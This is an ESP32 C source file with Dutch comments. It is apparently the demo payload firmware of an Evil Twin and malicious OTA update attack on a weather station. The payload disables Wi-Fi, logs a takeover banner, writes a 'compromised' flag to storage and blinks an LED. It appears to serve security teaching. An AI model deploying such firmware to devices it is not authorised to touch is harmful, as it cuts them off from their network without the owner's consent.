/**
 * ╔══════════════════════════════════════════════════════════════╗
 * ║  Malicious Payload Firmware                                  ║
 * ║  Doel: Wordt via de fake OTA naar het doelwit gestuurd       ║
 * ║  Effect: Toont overname, kan worden uitgebreid               ║
 * ╚══════════════════════════════════════════════════════════════╝
 * Deze firmware is wat het doelwit (WeMol weerstation) zou flashen
 * als het de malafide .bin downloadt van onze Evil Twin server.
 * In dit voorbeeld laat het alleen een knipperende LED zien en logt het
 * dat het apparaat is gecompromitteerd, maar in theorie kan dit alles zijn.
 */

#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "driver/gpio.h"
#include "esp_log.h"
#include "esp_system.h"
#include "nvs_flash.h"
#include "nvs.h"
#include "esp_wifi.h"
#include "esp_event.h"

static const char *TAG = "MALICIOUS_PAYLOAD";

/* GPIO die we gebruiken om de "overname" LED te laten zien */
#ifndef STATUS_LED_GPIO
#define STATUS_LED_GPIO    2  /* Standaard ESP32 Onboard Blue LED (GPIO 2) */
#endif

void app_main(void) {
    /* NVS init (voor als de originele firmware het gebruikte) */
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }

    /* Netwerk stopzetten — de aanvaller wil niet dat het apparaat
     * opnieuw verbinding maakt met het echte netwerk */
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_stop());
    ESP_ERROR_CHECK(esp_wifi_deinit());

    /* GPIO voor status-LED */
    gpio_reset_pin(STATUS_LED_GPIO);
    gpio_set_direction(STATUS_LED_GPIO, GPIO_MODE_OUTPUT);

    ESP_LOGE(TAG, "╔═══════════════════════════════════════╗");
    ESP_LOGE(TAG, "║  Dit apparaat is overgenomen via een  ║");
    ESP_LOGE(TAG, "║  Evil Twin + Malicious OTA aanval.    ║");
    ESP_LOGE(TAG, "╚═══════════════════════════════════════╝");

    /* Schrijf naar NVS dat het apparaat is gecompromitteerd */
    nvs_handle_t nvs;
    if (nvs_open("storage", NVS_READWRITE, &nvs) == ESP_OK) {
        nvs_set_i32(nvs, "compromised", 1);
        nvs_set_str(nvs, "payload_ver", "1.0");
        nvs_commit(nvs);
        nvs_close(nvs);
    }

    /* LED knippert in "noodsignaal" patroon: 2 snel, 2 langzaam */
    int pattern[] = {150, 150, 150, 150, 500, 500, 500, 500};
    int idx = 0;

    while (1) {
        gpio_set_level(STATUS_LED_GPIO, 1);
        vTaskDelay(pdMS_TO_TICKS(pattern[idx]));
        gpio_set_level(STATUS_LED_GPIO, 0);
        vTaskDelay(pdMS_TO_TICKS(pattern[idx]));
        idx = (idx + 1) % (sizeof(pattern) / sizeof(pattern[0]));
    }
}
